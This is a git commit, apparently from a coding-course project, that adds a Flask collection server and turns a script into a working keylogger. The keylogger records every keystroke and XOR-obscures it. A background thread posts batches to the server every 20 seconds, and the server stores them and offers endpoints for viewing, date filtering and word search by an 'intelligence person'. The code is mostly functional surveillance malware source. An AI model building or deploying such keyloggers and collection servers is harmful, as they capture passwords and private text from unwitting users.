18d1a8cf40e2e1ea829e344e633ed277ccd20b72
YairGreenberg <yair290899@gmail.com>
2025-09-02 21:57:28 +0300

    add design & fix functions

---
+++ The_server.py
@@ -0,0 +1,125 @@
+import json, os
+from flask import Flask, jsonify, request
+from flask_cors import CORS
+from Xor_2 import xor_on_key
+from datetime import datetime
+
+app = Flask(__name__)
+CORS(app)
+
+my_file = r"c:\my_python\kodcod1\saveData.json"
+
+
+@app.route('/save_data', methods=['POST'])
+def save_data():
+    """
+    Get data from agent and save it per a minute in json file
+    """
+    data = request.get_json()
+
+    if not data:
+        return jsonify({"status": "empty"})
+
+    for item in data:
+        item["text"] = xor_on_key(item["text"], 7)
+
+    if not os.path.exists(my_file) or os.stat(my_file).st_size == 0:
+        my_dict = list(data)
+    else:
+        with open(my_file, 'r', encoding='utf-8') as file:
+            try:
+                my_dict = json.load(file)
+                my_dict.extend(data)
+            except json.JSONDecodeError:
+                my_dict = []
+            except:
+                return jsonify({"status": False})
+
+    with open(my_file, 'w', encoding='utf-8') as updated_file:
+        json.dump(my_dict, updated_file, ensure_ascii=False)
+
+    return jsonify({"status": True})
+
+
+@app.route('/', methods=['GET'])
+def get_full_data():
+    """
+    function allows to intelligence person see all the data from the json  file
+    """
+    if not os.path.exists(my_file) or os.stat(my_file).st_size == 0:
+            my_dict = []
+    else:
+        with open(my_file, 'r', encoding='utf-8') as file:
+            try:
+                my_dict = json.load(file)
+            except json.JSONDecodeError:
+                my_dict = []
+    return jsonify(my_dict)
+
+
+@app.route('/filter/date', methods=['POST'])
+def filter_by_date():
+    """
+        function to filter the data by months and/or days.
+        the function should recive information in the following format:
+        body : { from_year : "2025", from_month : "05", from_day : "18", to_year : "2025", to_month : "08", to_day : "26" }
+    """
+    date = request.get_json()
+    from_date_str = f"{date['from_year']}-{date['from_month']}-{date['from_day']}"
+    to_date_str = f"{date['to_year']}-{date['to_month']}-{date['to_day']}"
+
+    from_date = datetime.strptime(from_date_str, "%Y-%m-%d")
+    to_date = datetime.strptime(to_date_str, "%Y-%m-%d")
+
+    if not os.path.exists(my_file) or os.stat(my_file).st_size == 0:
+        return jsonify({"status": "empty"})
+
+    with open(my_file, 'r', encoding='utf-8') as file:
+        try:
+            my_dict = json.load(file)
+        except json.JSONDecodeError:
+            my_dict = []
+
+    result = []
+    for item in my_dict:
+        try:
+            item_date = datetime.strptime(item["date"], "%m/%d/%y")
+            if from_date <= item_date <= to_date:
+                result.append(item)
+        except Exception as e:
+            continue
+
+    return jsonify(result)
+
+
+
+
+@app.route('/filter/string', methods=['POST'])
+def filter_by_string():
+    """
+    function to filter the data by specified word.
+    the function should recive information in the following format: body : { word : "some_string" } 
+    -- without speaces!
+    """
+    string = request.get_json()
+    word = string.get('word')
+    # t = request.get_json().get('word') # לבדוק אח"כ אם זה יעבוד ככה
+    result = []
+    if not os.path.exists(my_file) or os.stat(my_file).st_size == 0:
+        return jsonify({"status": "empty"})
+    else:
+        with open(my_file, 'r', encoding='utf-8') as file:
+            try:
+                my_dict = json.load(file)
+            except json.JSONDecodeError:
+                return jsonify({"status": "error"})
+    for item in my_dict:
+        if word in item["text"]:
+            result.append(item)
+    if result:
+        return jsonify(result)
+    return jsonify({"status": "empty"})
+
+
+if __name__ == '__main__':
+    app.run(debug=True, port=5000)
--- project_keylogger.py
+++ project_keylogger.py
@@ -1,58 +1,63 @@
-import keyboard                      #Import a library that records keyboard keystrokes.
+import keyboard, requests, threading, time                       #Import a library that records keyboard keystrokes.
 from datetime import datetime            #Import a library that records date and time.
 from Xor_2 import xor_on_key
 
+my_json = []
+url = f"http://127.0.0.1:5000/save_data"
+times = []
 
-dicti = {}                                          #A dictionary for saving input from the keyboard.
-str_for_show = ''
-filename = r"C:\my_python\+\file_for_kelogger.txt"
+def send_data_to_server():
+    status = requests.post(url, json=my_json)
+    return status
 
+def time_stoper(timeout, func):
+    def wrapper():
+        global my_json, times
+        while True:
+            time.sleep(timeout)
+            func()
+            my_json = []
+            times = []
+    t = threading.Thread(target=wrapper, daemon=True)
+    t.start()
+
+def replace_char(char):
+    if char == "backspace" or char == "space":
+        char = " "
+    if char == "enter":
+        char = "\n"
+    if char == "tab":
+        char = "\t"
+    if char == "decimal":
+        char = "."
+    return char
 
 def on_key_press(key):
-    
-    """ A function that receives input from another function (which records the keyboard),
+
+    """
+    A function that receives input from another function (which records the keyboard),
     and inserts it into a dictionary entry whose key is the current date and time.
     """
-    global str_for_show,dicti,filename
 
-    key = key.name
-    current_time = datetime.now().strftime('%d/%m/%y %H:%M')
-    with open(filename, "a") as our_file:
-        if current_time not in dicti:
-            dicti[current_time] = ''
-            our_file.write(f"**** {current_time} ****\n")
+    key = xor_on_key(replace_char(key.name), 7)
 
-        our_file.write(key)
-    dicti[current_time] += key
-    str_for_show += key
-    
-    if "show" in str_for_show.lower():
-        for k,v in dicti.items():                     #A loop that checks if the sequence of words "show" exists.
+    current_time = datetime.now().strftime('%y/%m/%d %H:%M')
+    year = datetime.now().strftime('%y')
+    month = datetime.now().strftime('%m')
+    day = datetime.now().strftime('%d')
+    hour = datetime.now().strftime('%H')
+    minute = datetime.now().strftime('%M')
 
-            print("\n****",k,"****")             #If this sequence exists, then the software will print everything that has been saved so far, and empty the dictionary.
-            if "show" in v.lower():
-                v = v[:-4]
-            if "space" in v:
-                v = v.replace("space", " ")
-            if "enter" in v:                               #Conditions for special characters.
-                v = v.replace("enter", "\n")
-            if "tab" in v:
-                v = v.replace("tab", "\t")
-            if "decimal" in v:
-                v = v.replace("decimal", ".")
+    if current_time not in times:
+        times.append(current_time)
+        my_json.append({"date": f"{month}/{day}/{year}", "time": f"{hour}:{minute}", "text": key})
+    else:
+        my_json[-1]["text"] += key
 
-
-            xor_retutn = xor_on_key(v, 7)         #Sending the value to the xor cipher.
-            print("encrypted:",xor_retutn, end="\n")     #Print the encrypted value.
-            print("decoded:",v,end = "\n")                   #Print the decoded value.
-
-           
-        dicti = {}
-        str_for_show = ''
 
 #For checking the current file.
 if __name__ == "__main__":
-    my_file = open(filename, "w")
-    my_file.write("")
     keyboard.on_press(on_key_press)               #function call.
+    print("program start")
+    time_stoper(20, send_data_to_server)
     keyboard.wait('Ctrl + Shift + .')           #Calling a function that terminates the program.
